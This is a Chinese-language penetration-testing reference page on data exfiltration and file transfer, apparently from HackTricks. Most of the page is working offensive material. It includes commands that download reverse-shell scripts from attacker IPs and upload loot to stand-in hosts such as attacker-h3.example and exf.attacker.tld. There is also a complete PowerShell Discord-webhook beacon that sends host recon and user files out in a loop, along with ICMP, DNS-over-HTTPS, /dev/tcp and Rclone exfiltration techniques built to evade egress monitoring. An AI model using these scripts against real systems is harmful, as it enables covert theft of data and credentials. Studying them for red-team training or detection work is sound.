# 数据外传

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> 如需端到端示例，了解如何将 loot 暂存到 `C:\Users\Public`，并使用 Rclone 外传以模拟合法备份，请查看以下工作流。

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## 常见的可用于外传信息的白名单域名

访问 [https://lots-project.com/](https://lots-project.com/) 查找可能被滥用的常见白名单域名

## 复制粘贴 Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### 上传文件

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer 打印 GET 和 POST（也包括 headers）**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python 模块 [uploadserver](https://pypi.org/project/uploadserver/)：

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPS 服务器**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

如果出口流量控制针对经典的 **TCP/443** 检查进行了调优，但对 **UDP/443** 的限制较宽松，强制使用 **HTTP/3** 可以让传输改走 **QUIC**，而不是基于 TCP 的 TLS。攻击者端点需要原生支持 HTTP/3（例如，已通过 `Alt-Svc: h3` 声明支持的反向代理或上传端点）。

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

一篇 2025 年的研究论文（QUIC-Exfil）发现，QUIC 的加密头部和动态地址变更会使防火墙层面检测数据外泄比检测基于 TLS 或 DNS 的通道更困难。论文还展示了一种服务器首选地址方法，可将数据外泄伪装成服务器端连接迁移。<sup>[[9]](#references)</sup>

### 预签名 / 委托对象存储上传

如果你能生成或获取一个短期有效的**签名 URL**，受害主机只需使用普通 HTTPS 客户端即可。这就不需要在主机上安装 cloud SDK 或使用长期凭证。<sup>[[8]](#references)</sup> 这种方式也可以混入常见的对象存储流量中。

**Linux / macOS（AWS S3 预签名 `PUT`）**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 pre-signed `PUT`)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Notes:
- Pre-signed URLs / SAS tokens 通常会限定 **path**、**HTTP method** 和 **expiration**。<sup>[[8]](#references)[[10]](#references)</sup>
- 对于 Azure Blob `Put Blob`，必须提供 `x-ms-blob-type: BlockBlob`。<sup>[[10]](#references)</sup>
- 此模式适用于 `curl`、`Invoke-WebRequest`，或任何能够发出原始 HTTPS `PUT` 请求的自定义 implant。

### goshs

[goshs](https://github.com/patrickhener/goshs) 是 `python3 -m http.server` 的单二进制替代方案。<sup>[[4]](#references)</sup>
它支持上传、下载、WebDAV、SFTP、SMB、TLS、身份验证、共享链接和 OOB 协作功能（DNS、SMTP、NTLM hash 捕获）。<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) 用于 C2 和 Data Exfiltration

Webhook 是只写 HTTPS 端点，可接受 JSON 和可选的文件部分。它们通常在可信 SaaS 域名的允许列表中，且无需 OAuth/API 密钥，因此适合用于低门槛的 beaconing 和 exfiltration。<sup>[[5]](#references)[[6]](#references)</sup>

关键要点：
- 端点：Discord 使用 https://discord.com/api/webhooks/<id>/<token>
- 发送 POST multipart/form-data，请求中包含名为 payload_json、内容为 {"content":"..."} 的部分，以及可选的名为 file 的文件部分。
- Operator 循环模式：定期 beacon -> 目录侦察 -> 定向文件 exfiltration -> 导出侦察结果 -> 休眠。HTTP 204 NoContent/200 OK 表示已确认交付。

PowerShell PoC（Discord）：

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

备注：
- 类似模式也适用于其他使用 incoming webhook 的协作平台（Slack/Teams）；相应调整 URL 和 JSON schema 即可。
- 有关 Discord Desktop cache artifacts 和 webhook/API recovery 的 DFIR，请参阅下方相关页面。<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone（云/对象存储 exfiltration）

现代 operator 通常会先在本地 **stage loot**，然后使用 [Rclone](https://rclone.org/) 让传输看起来像正常的备份或同步任务。一个实用模式是：

1. 一个常规 remote（`s3`、`webdav`、`drive`、`mega` 等）
2. 一个 `crypt` wrapper，以便在客户端加密 **内容和文件名**
3. 如果 provider 限制对象大小，或你希望上传单元更小，可选用 `chunker` wrapper

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

备注：
- `crypt` 可以加密文件内容和文件名。<sup>[[3]](#references)</sup>
- `chunker` 会以透明方式拆分大文件，并在下载时重新组装。<sup>[[11]](#references)</sup>
- `rclone.conf` 会以**混淆**形式存储 `crypt` 密钥，并不提供强大的静态数据保护。<sup>[[3]](#references)</sup> 对于短期操作，最好使用专用的临时配置，并在之后将其删除。如果必须保留更长时间，最好使用加密配置处理方式（`RCLONE_CONFIG_PASS` / `--password-command`），而不是将未加密的 `rclone.conf` 留在磁盘上。<sup>[[11]](#references)</sup>
- 如果目标系统已经同步 **OneDrive**、**Google Drive** 或 **Dropbox**，将 loot 复制到同步目录中，就可以借助已获批准的客户端，而不必投放新的传输二进制文件。

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP server (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP 服务器（NodeJS）

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP 服务器 (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** 客户端

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali 作为服务器

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

或者**使用 samba**创建 SMB 共享：

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) 是一种单二进制文件替代方案，可通过 SMB 提供文件，并捕获连接客户端的 NTLM hashes。<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

攻击者必须运行 SSHd。

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

如果受害者启用了 SSH，攻击者可以将受害者的目录挂载到自己的设备上。

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### 从受害者下载文件

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### 上传文件到受害者

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

感谢 **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

如果传统的 UDP/53 DNS 流量很显眼或遭到阻止，但出站 HTTPS 通常允许通过，可以将常见的 DNS 标签 exfiltration 模式封装在发往公共解析器的 **DoH** 请求中。每个标签都应远低于 63 字节的 DNS 限制，并使用 Base32 等适用于 DNS 的字符集。

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

在 `exf.attacker.tld` 的权威 DNS 服务器上，按数字前缀对查询排序，并重构 Base32 数据流。这样，传输会通过 HTTPS 发往解析器，而不是使用传统的 UDP/53 DNS。<sup>[[2]](#references)</sup>

如需完整的双向 DNS 隧道工具（`iodine`、`dnscat2` 等），请查看[隧道页面](tunneling-and-port-forwarding.md)。

## **SMTP**

如果你可以向 SMTP 服务器发送数据，就可以用 python 创建一个 SMTP 来接收数据：

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) 可以快速启动 SMTP 服务器，在 OOB exfiltration 场景中捕获电子邮件回调。<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

收到的电子邮件和 callback 会直接显示在终端输出中。
可与 DNS callback server 结合使用，实现完整的 OOB 覆盖：

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

默认情况下，XP 和 2003 中已包含（其他系统需要在安装期间显式添加）

在 Kali 中，**启动 TFTP 服务器**：

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**Python 中的 TFTP 服务器：**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

在 **victim** 上，连接到 Kali 服务器：

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

使用 PHP 单行命令下载文件：

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**受害者**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

`debug.exe` 程序不仅可以检查二进制文件，还具备**根据十六进制重建文件的能力**。这意味着，只要提供二进制文件的十六进制内容，`debug.exe` 就能生成该二进制文件。不过，需要注意的是，debug.exe **只能组装大小不超过 64 kb 的文件**。<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

然后将文本复制粘贴到 windows-shell 中，就会创建一个名为 nc.exe 的文件。

## References

- [1] [将文件传输到 Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` 后端](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [将 Discord 用作 C2 以及留下的缓存证据](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – 执行 Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord 取证套件（缓存解析器）](https://github.com/jwdfir/discord_cache_parser)
- [8] [使用预签名 URL 上传对象 - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil：利用 QUIC 的服务器首选地址功能实施数据外传攻击](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob（REST API）- Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Rclone 文档](https://rclone.org/docs/#configuration-encryption)
{{#include ../banners/hacktricks-training.md}}
